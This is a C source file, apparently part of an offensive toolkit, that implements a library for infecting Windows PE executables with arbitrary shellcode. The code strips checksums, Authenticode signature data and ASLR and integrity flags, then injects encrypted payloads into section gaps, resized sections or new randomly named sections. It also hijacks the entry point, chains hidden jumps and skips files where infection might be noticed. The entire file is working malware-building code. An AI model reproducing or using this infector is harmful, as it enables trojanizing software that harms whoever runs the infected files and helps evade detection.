/*
 * \file   libpeinfect.c
  * \brief  Infects a PE File with a given payload
 */

#include <time.h>
#include <stdlib.h>
#include "libpeinfect.h"
#include "libpeinfect_obfuscator.h"
#include "common.h"
#include "common_metapi.h"

 /* Min/Max Macros */
#define MIN(_a, _b) ((_a) < (_b) ? (_a) : (_b))
#define MAX(_a, _b) ((_a) > (_b) ? (_a) : (_b))

/* Executable Section */
#define EXECUTABLE_CHARACTERISTICS (IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE)

/* Patch Helper structure (INTERNAL USE ONLY) */
typedef struct _PATCH_HELPER {
	size_t infected_section;      // Infected section
	size_t old_rawsize;           // Old rawsize of section
	size_t old_virtualsize;       // Old virtualsize of section
	size_t old_rawheadersize;     // Old size of raw header
	size_t old_headerpaddingsize; // Old size of header padding
	size_t method;                // Method used
	struct _PATCH_HELPER *jmp;    // Cross section jmp
	unsigned char *jmp_code;      // Cross section jmp shellcode
	size_t jmpsize;               // Cross section jmp size
} PATCH_HELPER;


/* Checks if it's safe to infect file */
static  bool __peinfect_check_stealth(PEINFECT *in_infect, PEFILE *in_pe) {
	uint32_t i = 0;
	if (!in_infect->try_stealth) {
		return true;
	}

	/* .ndata section (NSIS Installer) */
	for (i = 0; i < in_pe->pe_header.NumberOfSections; ++i) {
		if (strcmp((char *)&in_pe->section_header[i].Name, ".ndata") == 0) {
			return false;
		}
	}

	return true;
}

/* Clean Header fields (ASLR, Checksum, Signature DataDir, ...)  */
static  void __peinfect_clean_header(PEFILE *out) {
	/* 32 bit */
	if (out->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC) {
		out->optional_header_32.CheckSum = 0x00; /* Zero Checksum */
		out->optional_header_32.DataDirectory[DIR_SECURITY].Size = 0x00; /* Zero Signature */
		out->optional_header_32.DataDirectory[DIR_SECURITY].VirtualAddress = 0x00; /* Zero Signature */
		out->optional_header_32.DllCharacteristics &= ~IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE; /* Remove ASLR Flag*/
		out->optional_header_32.DllCharacteristics &= ~IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY; /* Remove Force Integrity Check */

		/* 64 bit */
	}
	else {
		out->optional_header_64.CheckSum = 0x00; /* Zero Checksum */
		out->optional_header_64.DataDirectory[DIR_SECURITY].Size = 0x00; /* Zero Signature */
		out->optional_header_64.DataDirectory[DIR_SECURITY].VirtualAddress = 0x00; /* Zero Signature */
		out->optional_header_64.DllCharacteristics &= ~IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE; /* Remove ASLR Flag */
		out->optional_header_64.DllCharacteristics &= ~IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY; /* Remove Force Integrity Check */

	}
}

/* Build payload from pre-configured and add return to OEP */
static  unsigned char * __peinfect_build_payload(PEINFECT *in_infect, PEFILE *in_pe, size_t *payloadsize) {
	unsigned char *returncode = NULL;
	size_t returnsize = 0;
	unsigned char *payload = NULL;
	unsigned char *payload_encrypted = NULL;
	uint32_t i = 0;

	/* Build return code */
	returncode = peinfect_obfuscator_build_ep_jmp(in_pe, &returnsize);
	if (returncode == NULL) {
		return NULL;
	}

	/* 32 bit */
	if (in_pe->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC) {
		/* payload present? */
		if (in_infect->shellcode_x86 == NULL) {
			return NULL;
		}
		*payloadsize = in_infect->shellcode_x86size + returnsize;

		/* Allocate memory for payload and return */
		payload = (unsigned char *)malloc(*payloadsize);
		if (payload == NULL) {
			free(returncode);
			return NULL;
		}

		/* Copy shellcode */
		memcpy(payload, in_infect->shellcode_x86, in_infect->shellcode_x86size);
		/* Copy return code */
		memcpy(payload + in_infect->shellcode_x86size, returncode, returnsize);

		/* 64 bit */
	}
	else {
		/* payload present? */
		if (in_infect->shellcode_x64 == NULL) {
			return NULL;
		}
		*payloadsize = in_infect->shellcode_x64size + returnsize;

		/* Allocate memory for payload and return */
		payload = (unsigned char *)malloc(*payloadsize);
		if (payload == NULL) {
			free(returncode);
			return NULL;
		}

		/* Copy shellcode */
		memcpy(payload, in_infect->shellcode_x64, in_infect->shellcode_x64size);
		/* Copy return code */
		memcpy(payload + in_infect->shellcode_x64size, returncode, returnsize);
	}

	/* Free return code */
	free(returncode);

	/* Encode payload */
	if (in_infect->encrypt) {
		/* Iterative encoding */
		for (i = 0; i < in_infect->encrypt_iterations; ++i) {
			/* Try to encode */
			payload_encrypted = peinfect_obfuscator_encrypt_payload(payload, *payloadsize, &returnsize,
				!(in_pe->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC));
			if (payload_encrypted != NULL) {
				free(payload);
				payload = payload_encrypted;
				*payloadsize = returnsize;
			}
		}
	}

	return payload;
}

/* Generates random section name */
static  void __peinfect_random_sectionname(char *mem, size_t memsize) {
	size_t rnd;

	/* Nothing to do */
	if (mem == NULL || memsize == 0) {
		return;
	}

	mem[0] = '.';
	/* Fill with random AlphaNumerics*/
	while (--memsize != 0) {
		rnd = rand() % 3;
		if (rnd == 1) { /* 0 - 9*/
			mem[memsize] = 0x30 + rand() % 10;
		}
		else if (rnd == 2) { /* A - Z */
			mem[memsize] = 0x41 + rand() % 26;
		}
		else { /* a - z */
			mem[memsize] = 0x61 + rand() % 26;
		}
	}
}

/* Try infecting using alignment gap */
static  int __peinfect_infect_alignment(PEINFECT *in, unsigned char *payload, size_t payloadsize,
	PATCH_HELPER *helper, int no_use_section, PEFILE *out) {
	size_t i;
	uint32_t ep;
	uint32_t old_virtsize;
	uint32_t old_rawsize;

	/* Method allowed? */
	if (!(in->methods & METHOD_ALIGNMENT)) {
		return false;
	}

	/* Clear helper structure */
	if (helper != NULL) {
		memset(helper, 0, sizeof(PATCH_HELPER));
	}

	/* Need Entry Point */
	if (out->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC) {
		if (out->optional_header_32.AddressOfEntryPoint == 0) {
			return false;
		}
	}
	else {
		if (out->optional_header_64.AddressOfEntryPoint == 0) {
			return false;
		}
	}

	for (i = 0; i < out->pe_header.NumberOfSections; ++i) {
		/* Don't use this section */
		if (no_use_section == (int)i) {
			continue;
		}

		/* Section is Executable */
		if ((in->methods & METHOD_CHANGE_FLAGS)
			|| ((out->section_header[i].Characteristics & IMAGE_SCN_CNT_CODE)
				&& (out->section_header[i].Characteristics & IMAGE_SCN_MEM_READ)
				&& (out->section_header[i].Characteristics & IMAGE_SCN_MEM_WRITE)
				&& (out->section_header[i].Characteristics & IMAGE_SCN_MEM_EXECUTE))) {

			/* Size Available */
			if ((out->section_header[i].SizeOfRawData > out->section_header[i].Misc.VirtualSize)
				&& ((out->section_header[i].SizeOfRawData - out->section_header[i].Misc.VirtualSize) >= payloadsize)) {

				/* New Entry Point */
				ep = out->section_header[i].VirtualAddress + out->section_header[i].Misc.VirtualSize;
				old_virtsize = out->section_header[i].Misc.VirtualSize;
				old_rawsize = out->section_header[i].SizeOfRawData;

				/* Save helper data for patch */
				if (helper != NULL) {
					helper->infected_section = i;
					helper->old_virtualsize = old_virtsize;
					helper->old_rawsize = old_rawsize;
					helper->method = METHOD_ALIGNMENT;
				}

				/* Update Section */
				if (petool_resize_section(i, old_rawsize, old_virtsize + payloadsize, (helper != NULL), out)) {
					/* Copy payload in position */
					if (helper == NULL) {
						memcpy(out->section_data[i].mem + old_virtsize, payload, payloadsize);
					}

					/* Set new EntryPoint */
					if (out->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC) {
						out->optional_header_32.AddressOfEntryPoint = ep;
					}
					else {
						out->optional_header_64.AddressOfEntryPoint = ep;
					}

					/* Change flags if needed */
					if (in->methods & METHOD_CHANGE_FLAGS) {
						out->section_header[i].Characteristics |= EXECUTABLE_CHARACTERISTICS;
					}

					/* Infect OK */
					return (int)i + 1;
				}
			}
		}
	}

	/* :( */
	return false;
}

/* Try infecting using alignment gap and resize  */
static  int __peinfect_infect_alignment_resize(PEINFECT *in, unsigned char *payload, size_t payloadsize,
	PATCH_HELPER *helper, int no_use_section, PEFILE *out) {
	size_t i;
	uint32_t ep;
	uint32_t old_virtsize;
	uint32_t old_rawsize;
	uint32_t rawsize_delta;

	/* Method allowed? */
	if (!(in->methods & METHOD_ALIGNMENT_RESIZE)) {
		return false;
	}

	/* Clear helper structure */
	if (helper != NULL) {
		memset(helper, 0, sizeof(PATCH_HELPER));
	}

	/* Need Entry Point */
	if (out->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC) {
		if (out->optional_header_32.AddressOfEntryPoint == 0) {
			return false;
		}
	}
	else {
		if (out->optional_header_64.AddressOfEntryPoint == 0) {
			return false;
		}
	}

	for (i = 0; i < out->pe_header.NumberOfSections; ++i) {
		/* Don't use this section */
		if (no_use_section == (int)i) {
			continue;
		}

		/* Section is Executable */
		if ((in->methods & METHOD_CHANGE_FLAGS)
			|| ((out->section_header[i].Characteristics & IMAGE_SCN_CNT_CODE)
				&& (out->section_header[i].Characteristics & IMAGE_SCN_MEM_READ)
				&& (out->section_header[i].Characteristics & IMAGE_SCN_MEM_WRITE)
				&& (out->section_header[i].Characteristics & IMAGE_SCN_MEM_EXECUTE))) {

			/* Size Available */
			if ((out->section_header[i].SizeOfRawData > out->section_header[i].Misc.VirtualSize)
				&& (((i + 1) >= out->pe_header.NumberOfSections)
					|| ((out->section_header[i + 1].VirtualAddress
						- (out->section_header[i].VirtualAddress + out->section_header[i].Misc.VirtualSize)) >= payloadsize))) {

				/* New Entry Point */
				ep = out->section_header[i].VirtualAddress + out->section_header[i].Misc.VirtualSize;
				old_virtsize = out->section_header[i].Misc.VirtualSize;
				old_rawsize = out->section_header[i].SizeOfRawData;

				/* New Space needed */
				rawsize_delta = (uint32_t)(payloadsize - (old_rawsize - old_virtsize));

				/* Save helper data for patch */
				if (helper != NULL) {
					helper->infected_section = i;
					helper->old_virtualsize = old_virtsize;
					helper->old_rawsize = old_rawsize;
					helper->method = METHOD_ALIGNMENT_RESIZE;
				}

				/* Update Section */
				if (petool_resize_section(i, old_rawsize + rawsize_delta, old_virtsize + payloadsize, (helper != NULL), out)) {

					/* Copy payload in position */
					if (helper == NULL) {
						memcpy(out->section_data[i].mem + old_virtsize, payload, payloadsize);
					}

					/* Set new EntryPoint */
					if (out->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC) {
						out->optional_header_32.AddressOfEntryPoint = ep;
					}
					else {
						out->optional_header_64.AddressOfEntryPoint = ep;
					}

					/* Change flags if needed */
					if (in->methods & METHOD_CHANGE_FLAGS) {
						out->section_header[i].Characteristics |= EXECUTABLE_CHARACTERISTICS;
					}

					/* Infect OK */
					return (int)i + 1;
				}
			}
		}
	}

	/* :( */
	return false;
}

/* Try infecting inserting new section */
static  int __peinfect_infect_new_section(PEINFECT *in, unsigned char *payload, size_t payloadsize,
	PATCH_HELPER *helper, int no_use_section, PEFILE *out) {
	int returnVar = false;
	char *section_name = NULL;
	size_t section_namesize = 0;
	char rnd_sectionname[NT_SHORT_NAME_LEN] = { 0 };

	/* Method allowed? */
	if (!(in->methods & METHOD_NEW_SECTION)) {
		return false;
	}

	/* Clear helper structure */
	if (helper != NULL) {
		memset(helper, 0, sizeof(PATCH_HELPER));
	}

	/* Need Entry Point */
	if (out->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC) {
		if (out->optional_header_32.AddressOfEntryPoint == 0) {
			return false;
		}
	}
	else {
		if (out->optional_header_64.AddressOfEntryPoint == 0) {
			return false;
		}
	}

	/* Save helper data for patch */
	if (helper != NULL) {
		helper->old_rawheadersize = out->dos_header.e_lfanew + sizeof(PE_HEADER) + out->pe_header.SizeOfOptionalHeader
			+ out->pe_header.NumberOfSections * sizeof(SECTION_HEADER) + out->header_padding.memsize;
		helper->old_headerpaddingsize = out->header_padding.memsize;
	}

	/* Random section name? */
	if (in->rnd_sectionname) {
		section_namesize = (NT_SHORT_NAME_LEN / 2) + rand() % (NT_SHORT_NAME_LEN / 2 + 1);
		__peinfect_random_sectionname(rnd_sectionname, section_namesize);
		section_name = rnd_sectionname;
	}
	else {
		section_name = in->section_name;
		section_namesize = in->section_namesize;
	}

	/* Try add section */
	if (petool_add_section(section_name, section_namesize, EXECUTABLE_CHARACTERISTICS, payload, payloadsize,
		(helper != NULL), out)) {
		/* New Entry Point*/
		if (out->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC) {
			out->optional_header_32.AddressOfEntryPoint =
				out->section_header[out->pe_header.NumberOfSections - 1].VirtualAddress;
		}
		else {
			out->optional_header_64.AddressOfEntryPoint =
				out->section_header[out->pe_header.NumberOfSections - 1].VirtualAddress;
		}

		/* Save helper data for patch */
		if (helper != NULL) {
			helper->infected_section = out->pe_header.NumberOfSections - 1;
			helper->method = METHOD_NEW_SECTION;
		}

		returnVar = out->pe_header.NumberOfSections;
	}

	return returnVar;
}

/* Try infecting using hidden jmp method */
static  bool __peinfect_infect_cross_section_jmp(PEINFECT *in, unsigned char *payload, size_t payloadsize,
	PATCH_HELPER *helper, int no_use_section, PEFILE *out) {
	size_t jmpsize = 0;
	uint32_t section = 0;
	uint32_t jmp_section = 0;
	PATCH_HELPER *jmp_helper = NULL;
	size_t i = 0;
	unsigned char *jmp_payload = NULL;

	/* Method allowed? */
	if (!(in->methods & METHOD_CROSS_SECTION_JUMP)) {
		return false;
	}

	/* Clear helper structure */
	if (helper != NULL) {
		memset(helper, 0, sizeof(PATCH_HELPER));
	}

	/* Need Entry Point */
	if (out->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC) {
		if (out->optional_header_32.AddressOfEntryPoint == 0) {
			return false;
		}
	}
	else {
		if (out->optional_header_64.AddressOfEntryPoint == 0) {
			return false;
		}
	}

	/* Infect normal */
	if (!((section = __peinfect_infect_alignment(in, payload, payloadsize, helper, no_use_section, out)) || (section =
		__peinfect_infect_alignment_resize(in, payload, payloadsize, helper, no_use_section, out)) || (section =
			__peinfect_infect_new_section(in, payload, payloadsize, helper, no_use_section, out)))) {
		return false;
	}

	/* Insert jumps */
	for (i = 0; i < in->jump_iterations; ++i) {

		/* Build jmp */
		jmp_payload = peinfect_obfuscator_build_ep_jmp(out, &jmpsize);

		/* Exit, no JMP shellcode */
		if (jmp_payload == NULL) {
			return true;
		}

		/* Build jmp helper struct if needed */
		if (helper != NULL) {
			jmp_helper = malloc(sizeof(PATCH_HELPER));
			if (jmp_helper == NULL) {
				free(jmp_payload);
				return true;
			}
			memset(jmp_helper, 0, sizeof(PATCH_HELPER));
		}

		/* Inject jmp in another section*/
		if (!((jmp_section = __peinfect_infect_alignment(in, jmp_payload, jmpsize, jmp_helper, section - 1, out))
			|| (jmp_section = __peinfect_infect_new_section(in, jmp_payload, jmpsize, jmp_helper, section - 1, out)))) {
			free(jmp_payload);
			if (jmp_helper != NULL) {
				free(jmp_helper);
			}
			return true;
		}
		section = jmp_section;

		/* Safe jmp payload */
		if (helper != NULL) {
			helper->jmp = jmp_helper;
			jmp_helper->jmp_code = jmp_payload;
			jmp_helper->jmpsize = jmpsize;
			helper = jmp_helper;
		}
		else {
			/* Free tmp payload */
			free(jmp_payload);
		}
	}

	return true;
}

void peinfect_init(PEINFECT *out) {
	memset(out, 0, sizeof(PEINFECT));

	/* For the glory of beelzebub and random section names */
	srand((uint32_t)time(NULL));

	/* Allow all methods, except METHOD_CROSS_SECTION_JUMP */
	out->methods = METHOD_NEW_SECTION; //METHOD_ALL & ~METHOD_CROSS_SECTION_JUMP; //VERIFY THIS

	/* Remove integrity checks */
	out->remove_integrity = true;

	/* Random section names  */
	out->rnd_sectionname = true;

	/* Cross section jump interations */
	out->jump_iterations = 1;

	/* Encrypt shellcode */
	out->encrypt = true;

	/* Encryption iterations */
	out->encrypt_iterations = 1;

	/* Try to be stealthy */
	out->try_stealth = true;
}

void peinfect_set_sectionname(char *section_name, size_t section_namesize, bool random, PEINFECT *out) {

	char *old_section_name = NULL;

	/* Remove old section name */
	if (out->section_name != NULL) {
		/* Don't free here so that the swap is an atomic operation
		 and it's possible to change section name while it's used
		 in another thread for infection without the possibility of
		 a use-after-free. Not the cleanest solution, but better
		 than heavy synchronization overhead */
		old_section_name = out->section_name;
		out->section_name = NULL;
	}

	/* Set New section name */
	if ((!random) && section_name != NULL) {
		/* Limit size according to PE COFF */
		out->section_namesize = MIN(NT_SHORT_NAME_LEN, section_namesize);
		/* Copy new section name */
		out->section_name = malloc(out->section_namesize + 1);
		if (out->section_name != NULL) {
			memcpy(out->section_name, section_name, out->section_namesize);
			out->section_name[out->section_namesize] = 0x00;
		}
	}

	/* Random Section Name?*/
	out->rnd_sectionname = random;

	/* Free old section Name*/
	if (old_section_name != NULL) {
		free(old_section_name);
	}
}

char* peinfect_get_sectionname(PEINFECT *in) {
	return in->section_name;
}

void peinfect_set_methods(PEINFECT_METHOD methods, PEINFECT *out) {
	/* Set Methods */
	out->methods = methods;
}

PEINFECT_METHOD peinfect_get_methods(PEINFECT *in) {
	return in->methods;
}

void peinfect_set_jumpiterations(uint32_t iterations, PEINFECT *out) {
	/* Set Iterations */
	out->jump_iterations = MIN(MAX(iterations, 1), 64);
}

uint32_t peinfect_get_jumpiterations(PEINFECT *in) {
	return in->jump_iterations;
}

void peinfect_set_encryptiterations(uint32_t iterations, PEINFECT *out) {
	/* Set Iterations */
	out->encrypt_iterations = MIN(MAX(iterations, 1), 16);
}

uint32_t peinfect_get_encryptiterations(PEINFECT *in) {
	return in->encrypt_iterations;
}

void peinfect_set_removeintegrity(bool remove_integrity, PEINFECT *out) {
	out->remove_integrity = remove_integrity;
}

bool peinfect_get_removeintegrity(PEINFECT *in) {
	return in->remove_integrity;
}

void peinfect_set_encrypt(bool encrypt, PEINFECT *out) {
	out->encrypt = encrypt;
}

bool peinfect_get_encrypt(PEINFECT *in) {
	return in->encrypt;
}

void peinfect_set_trystaystealth(bool try_stealth, PEINFECT *out) {
	out->try_stealth = try_stealth;
}

bool peinfect_get_trystaystealth(PEINFECT *in) {
	return in->try_stealth;
}

bool peinfect_set_shellcode(unsigned char *mem, size_t memsize, bool x64, PEINFECT *out) {
	unsigned char *newmem = NULL;
	unsigned char *oldmem = NULL;

	/* Allocate memory and copy new shellcode */
	if (memsize) {
		newmem = malloc(memsize);
		if (newmem == NULL) {
			return false;
		}
		memcpy(newmem, mem, memsize);
	}

	/* Set x64 Shellcode */
	if (x64) {
		/* Store old memory pointer */
		if (out->shellcode_x64 != NULL) {
			oldmem = out->shellcode_x64;
		}
		/* Set shellcode size and mem */
		out->shellcode_x64 = newmem;
		out->shellcode_x64size = memsize;

		/* Reset counter */
		out->infect_cnt_x64 = 0;

		/* Set x86 Shellcode */
	}
	else {
		/* Store old memory pointer */
		if (out->shellcode_x86 != NULL) {
			oldmem = out->shellcode_x86;
		}
		/* Set shellcode size and mem */
		out->shellcode_x86 = newmem;
		out->shellcode_x86size = memsize;

		/* Reset counter */
		out->infect_cnt_x86 = 0;
	}

	/* Free old memory */
	if (oldmem != NULL) {
		free(oldmem);
	}

	return true;
}

unsigned char* peinfect_get_shellcode(PEINFECT *in, bool x64) {
	return x64 ? in->shellcode_x64 : in->shellcode_x86;
}

bool peinfect_infect_full(unsigned char *mem, size_t memsize, PEINFECT *in, PEFILE *out) {
	unsigned char *payload;
	size_t payloadsize;
	bool returnVar = false;

	/* Try parse PE File */
	if (!pefile_read_mem(mem, memsize, NULL, out)) {
		return false;
	}

	/* Optional Header present? */
	if (!((out->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC)
		|| (out->optional_header_64.Magic == NT_OPTIONAL_64_MAGIC))) {
		return false;
	}

	/* Clean Header fields (ASLR, Checksum, Signature DataDir, ...) */
	if (in->remove_integrity) {
		__peinfect_clean_header(out);
	}

	/* Stealth checks */
	if (!__peinfect_check_stealth(in, out)) {
		return false;
	}

	/* Build payload */
	if ((payload = __peinfect_build_payload(in, out, &payloadsize)) == NULL) {
		return false;
	}

	/* Try hidden jump inject */
	if (__peinfect_infect_cross_section_jmp(in, payload, payloadsize, NULL, -1, out))
		returnVar = true;

	/* Try alignment inject */
	if (__peinfect_infect_alignment(in, payload, payloadsize, NULL, -1, out))
		returnVar = true;

	/* Try alignment inject with resize */
	if (__peinfect_infect_alignment_resize(in, payload, payloadsize, NULL, -1, out))
		returnVar = true;

	/* Try new section */
	if (__peinfect_infect_new_section(in, payload, payloadsize, NULL, -1, out))
		returnVar = true;

	/* Free payload */
	free(payload);

	/* Free PE File if not successful */
	if (!returnVar) {
		pefile_free(out);
	}

	return returnVar;
}

bool peinfect_infect_full_file(char *infile, PEINFECT *in, char *outfile) {
	bool returnVar = false;
	unsigned char *file_mem;
	PEFILE pefile;

	/* Open file */
	FILE *fh;
	wchar_t *file_w = met_api->string.utf8_to_wchar(infile);
	if (_wfopen_s(&fh, file_w, L"rb") == 0) {

		/* Get file size and allocate buffer */
		if (!fseek(fh, 0L, SEEK_END)) {
			size_t size = ftell(fh);
			size_t read_size = 0;
			rewind(fh);
			file_mem = malloc(size);

			if (file_mem != NULL) {
				/* Load file into buffer */
				read_size = fread(file_mem, size, 1, fh);
				fclose(fh);
				fh = NULL;

				/* Process file in memory */
				if (read_size == 1) {
					returnVar = peinfect_infect_full(file_mem, size, in, &pefile);
				}

				/* free buffer after use */
				free(file_mem);

				/* Write file to disk*/
				if (returnVar) {
					returnVar = pefile_write_file(&pefile, NULL, outfile);
				}
			}
		}

		/* Close file (if memory allocation has failed) */
		if (fh != NULL) {
			fclose(fh);
		}
	}
	free(file_w);

	return returnVar;
}

void peinfect_free(PEINFECT *in) {
	/* Free x86 Shellcode */
	if (in->shellcode_x86 != NULL) {
		free(in->shellcode_x86);
	}

	/* Free x64 Shellcode */
	if (in->shellcode_x64 != NULL) {
		free(in->shellcode_x64);
	}

	/* Free SectionName */
	if (in->section_name != NULL) {
		free(in->section_name);
	}

	/* Zero struct */
	memset(in, 0, sizeof(PEINFECT));
}


